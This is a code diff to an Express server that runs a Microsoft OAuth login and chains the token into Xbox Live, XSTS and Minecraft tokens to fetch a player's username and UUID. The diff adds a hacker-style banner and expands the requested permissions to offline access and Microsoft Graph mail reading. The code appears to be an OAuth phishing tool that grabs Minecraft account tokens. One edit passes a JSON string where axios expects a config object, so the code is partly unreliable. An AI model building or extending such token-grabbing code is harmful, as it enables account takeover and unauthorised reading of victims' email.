@@ -21,7 +21,9 @@ app.use(
 		extended: true,
 	})
 );
-const ascii = `
+const ascii = 
+`
+\n
 ▒██   ██▓█████ ███▄    █ ▒█████  ███▄    █     ▒█████  ▄▄▄      █    ██▄▄▄█████▓██░ ██ 
 ▒▒ █ █ ▒▓█   ▀ ██ ▀█   █▒██▒  ██▒██ ▀█   █    ▒██▒  ██▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒
 ░░  █   ▒███  ▓██  ▀█ ██▒██░  ██▓██  ▀█ ██▒   ▒██░  ██▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░
@@ -39,13 +41,13 @@ var clientSecret = process.env.clientSecret
 var redirectUrl = process.env.redirectUrl
 var microsoftOauthUrl = 'https://login.live.com/oauth20_token.srf';
 var scopes = encodeURIComponent(
-	'XboxLive.signin'
+	`XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read`
 );
 console.clear();
 console.log(chalk.red(ascii));
 
 app.listen(port, () => {
-	console.log(`listening on port ${port}`)
+	console.log(`\nlistening on port ${port}`)
 });
 
 app.get(`/token`, async (req, res) => {
@@ -102,12 +104,7 @@ async function getXblToken(access_token) {
 		RelyingParty: 'http://auth.xboxlive.com',
 		TokenType: 'JWT',
 	};
-	const response = await http_client_methods_1.HttpPost(
-		'https://user.auth.xboxlive.com/user/authenticate',
-		config,
-		{ 'Content-Type': 'application/json', 'Accept': 'application/json' }
-	);
-	console.log(`[[${response}]]`)
+	const response = await http_client_methods_1.HttpPost('https://user.auth.xboxlive.com/user/authenticate', JSON.stringify(config), { 'Content-Type': 'application/json', 'Accept': 'application/json' });
 	const ParsedRes = JSON.parse(response);
 	const xblToken = ParsedRes.Token;
 
@@ -127,7 +124,7 @@ async function GetXstsToken(xblToken) {
 	};
 	const response = await http_client_methods_1.HttpPost(
 		`https://xsts.auth.xboxlive.com/xsts/authorize`,
-		config
+		JSON.stringify(config)
 	);
 	const ParsedRes = JSON.parse(response);
 	const XstsToken = ParsedRes.Token;
@@ -141,7 +138,7 @@ async function getMcToken(xstsToken, xstsUuid) {
 	};
 	const response = await http_client_methods_1.HttpPost(
 		'https://api.minecraftservices.com/authentication/login_with_xbox',
-		config
+		JSON.stringify(config)
 	);
 	const RepParsed = JSON.parse(response);
 	return RepParsed;
@@ -155,7 +152,7 @@ async function getUsername(token) {
 	};
 	const response = await axios.get(
 		`https://api.minecraftservices.com/minecraft/profile`,
-		config
+		JSON.stringify(config)
 	);
 	var ign = response.data.name;
 	var uuid = response.data.id;
